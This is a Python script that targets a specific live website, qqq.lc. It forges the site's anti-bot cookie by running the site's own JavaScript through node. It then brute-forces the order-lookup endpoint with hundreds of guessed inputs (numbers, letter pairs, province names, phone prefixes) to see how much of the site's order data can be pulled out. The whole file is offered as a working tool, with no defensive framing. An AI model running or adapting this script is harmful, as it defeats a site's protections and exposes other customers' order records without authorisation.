
import re,subprocess,json,time,string
HOST='qqq.lc';BASE=f'https://{HOST}'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
class Jar:
    def __init__(self): self.c={}
    def header(self): return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr_text):
        for line in hdr_text.splitlines():
            if line.lower().startswith('set-cookie:'):
                part=line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v=part.split('=',1); self.c[k.strip()]=v.strip()
jar=Jar()
def curl(path, method='GET', data=None, headers=None, t=35):
    cmd=['curl','-sk','-D','-','--max-time',str(t),'-A',UA,'--max-redirs','0']
    if jar.c: cmd+=['-H',f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items(): cmd+=['-H',f'{k}: {v}']
    url=BASE+path
    if method=='POST':
        cmd+=['-X','POST','-H','Content-Type: application/x-www-form-urlencoded','--data-binary',data or '']
    cmd.append(url)
    p=subprocess.run(cmd,capture_output=True,timeout=t+15)
    text=(p.stdout or b'').decode('utf-8','replace')
    hdr,body=(text.split('\r\n\r\n',1)+[''])[:2] if '\r\n\r\n' in text else (text,'')
    jar.absorb(hdr); return body
body=curl('/')
m=re.search(r"setCookie\('ccsafe_defend',(.+?)\);",body)
val=subprocess.check_output(['node','-e','console.log('+m.group(1)+')']).decode().strip()
jar.c['ccsafe_defend']=val; jar.c['ccsafe_defend_time']='2'
curl('/'); curl('/user/login.php')
xhr={'X-Requested-With':'XMLHttpRequest'}
gc=json.loads(curl('/ajax.php?act=getcount',method='POST',data='',headers=xhr))
print('GETCOUNT', json.dumps(gc, ensure_ascii=False))

# candidate inputs: digits, provinces (from desc), letters, common words
provinces=['广东','山东','河南','江苏','四川','河北','湖南','浙江','安徽','湖北','广西','云南','江西','辽宁','福建','陕西','贵州','山西','重庆','黑龙江','新疆','甘肃','上海','吉林','内蒙古','北京','天津','海南','宁夏','青海','西藏']
cands=set()
for i in range(0,100):
    cands.add(str(i))
for a in string.ascii_lowercase:
    cands.add(a); cands.add(a.upper())
for a in string.ascii_lowercase:
    for b in string.ascii_lowercase:
        cands.add(a+b)
for p in provinces:
    cands.add(p)
for w in ['qq','QQ','test','admin','1 ','null','undefined','广东','山东']:
    cands.add(w)
# phone prefixes 3-digit
for p in ['130','131','132','133','134','135','136','137','138','139','145','147','149','150','151','152','153','155','156','157','158','159','166','170','171','172','173','175','176','177','178','180','181','182','183','184','185','186','187','188','189','191','198','199']:
    cands.add(p)

hits={}
errors=0
for i,q in enumerate(sorted(cands, key=lambda x:(len(x),x))):
    try:
        body=curl('/ajax.php?act=query',method='POST',data=f'querytype=1&qq={q}&page=1',headers=xhr)
        j=json.loads(body)
    except Exception as e:
        errors+=1
        time.sleep(1)
        continue
    tot=j.get('total') or 0
    if tot:
        hits[q]=tot
        print(f'HIT {q!r} total={tot}')
    if i%50==0:
        print(f'progress {i}/{len(cands)} hits={len(hits)}')
    time.sleep(0.22)

# estimate unique orders: inputs are exact-match partitions, so sum totals of hit inputs
covered=sum(hits.values())
print('===SUMMARY===')
print(json.dumps({
  'site_orders': gc.get('orders'),
  'site_money': gc.get('money'),
  'inputs_tested': len(cands),
  'inputs_with_hits': len(hits),
  'covered_orders_sum': covered,
  'coverage_pct': round(100*covered/max(gc.get('orders') or 1,1), 2),
  'top_inputs': sorted(hits.items(), key=lambda x:-x[1])[:30],
  'errors': errors,
}, ensure_ascii=False, indent=2))
open('/tmp/qqqlc_enum_totals.json','w').write(json.dumps({'hits':hits,'gc':gc},ensure_ascii=False))
